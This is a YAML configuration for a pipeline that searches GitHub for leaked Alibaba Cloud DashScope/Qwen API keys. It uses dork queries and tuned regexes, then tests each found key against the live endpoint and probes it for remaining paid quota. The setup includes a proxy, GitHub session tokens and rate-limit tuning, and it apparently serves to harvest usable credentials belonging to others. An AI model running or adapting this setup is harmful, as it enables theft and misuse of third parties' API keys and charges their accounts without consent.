# Alibaba Cloud Qwen (DashScope Model Studio) — international scan (task: qwen-intl)
# Endpoint: https://dashscope-intl.aliyuncs.com/compatible-mode/v1   (international)
# NOTE: the mainland endpoint is a SEPARATE config:
#   qwen-cn -> examples/config-qwen.yaml               (dashscope.aliyuncs.com)
# Keys are sk- prefixed and region-specific (cannot be mixed).
# Upstream: per-endpoint GitHub search conditions (top 1000 results per query).
# Downstream: validates keys against this endpoint's GET /models, then probes a
# minimal chat completion to surface 402/429-quota (zero-balance keys are
# filtered to no-quota-keys.txt instead of being marked valid).
# Results are written to ./data-qwen-intl/providers/qwen-intl/*.txt

global:
  workspace: "./data-qwen-intl"
  max_retries_requeued: 3
  proxy: ""
  github_credentials:
    sessions:
      - "your_github_session_here"
    tokens:
      - "your_github_token_here"
    strategy: "round_robin"
  user_agents:
    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

pipeline:
  threads:
    search: 1
    gather: 4
    check: 2
    inspect: 1
  queue_sizes:
    search: 100000
    gather: 200000
    check: 500000
    inspect: 1000000

monitoring:
  update_interval: 2.0
  error_threshold: 0.1
  queue_threshold: 1000000
  memory_threshold: 1073741824
  response_threshold: 5.0

persistence:
  batch_size: 50  # flush every 50 items (or save_interval seconds); 1 = a write+log per item
  save_interval: 5
  queue_interval: 60
  snapshot_interval: 300
  auto_restore: false  # clean start (replay ratchets the corpus)
  shutdown_timeout: 30
  format: txt

ratelimits:
  github_api:
    base_rate: 0.15
    burst_limit: 3
    adaptive: true
  qwen-cn:
    base_rate: 0.2
    burst_limit: 2
    adaptive: true
  qwen-intl:
    base_rate: 0.2
    burst_limit: 2
    adaptive: true

tasks:
  - name: qwen-intl
    enabled: true
    provider_type: qwen
    use_api: true
    max_pages: 1000
    search_types: [code]
    stages:
      search: true
      gather: true
      check: true
      inspect: true
    api:
      base_url: https://dashscope-intl.aliyuncs.com/compatible-mode/v1
      completion_path: /chat/completions
      model_path: /models
      default_model: qwen-turbo
      auth_key: Authorization
      extra_headers: {}
      api_version: ""
      timeout: 30
      retries: 3
      use_proxy: true  # international endpoint — route through proxy
    patterns:
      # Real qwen format MEASURED `sk-` + 32 hex (n=315 authentic on the CN
      # endpoint, prod 2026-09-22; same vendor key shape). The former naked
      # sk- pattern measured 1441 invalid/run on the CN task (placeholders
      # and other vendors' sk- keys). Format alone cannot separate DashScope
      # from other sk- vendors, so the task-level pattern only fires on
      # DASHSCOPE_*/QWEN_* env-name assignments; dashscope-intl host-named
      # conditions override with a Bearer/quoted variadic below. The
      # lookahead skips Anthropic / OpenAI project / service-account keys. No
      # upper bound on the body: a fixed width silently drops keys if the
      # provider rotates the format (serpapi lesson) — 32-hex is documented,
      # not enforced.
      key_pattern: >-
        (?i)(?:dashscope[_-]?(?:api[_-]?)?key|DASHSCOPE_API_KEY|QWEN_API_KEY|qwen[_-]?api[_-]?key)[\"'\]]{0,2}\s*[:=]\s*[\"']?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})[\"']?
      address_pattern: ""
      endpoint_pattern: ""
      model_pattern: ""
    conditions:
      # International Model Studio (Alibaba Cloud Intl): dashscope-intl.
      # Env-name dorks inherit the narrow task pattern above; dorks naming
      # the dashscope-intl host override with a Bearer/quoted variadic.
      - query: '"dashscope-intl.aliyuncs.com"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" "Authorization"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" "api_key"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"DASHSCOPE_API_KEY" "intl"'
      - query: '"QWEN_API_KEY"'
      - query: '"qwen" "api_key" "alibaba"'
      - query: '"alibabacloud.com" "model-studio" "api_key"'
      - query: '"sk-" "dashscope-intl.aliyuncs.com"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" language:Python'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" language:JavaScript'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" extension:env'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope-intl.aliyuncs.com" extension:json'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(sk-(?!(?:ant|proj|svcacct)-)[A-Za-z0-9]{16,})
      - query: '"dashscope" extension:yaml'
      - query: '"QWEN_API_KEY" language:Python'
    rate_limit:
      base_rate: 0.2
      burst_limit: 2
      adaptive: true
    storage:
      directory: ""
      plan: ""
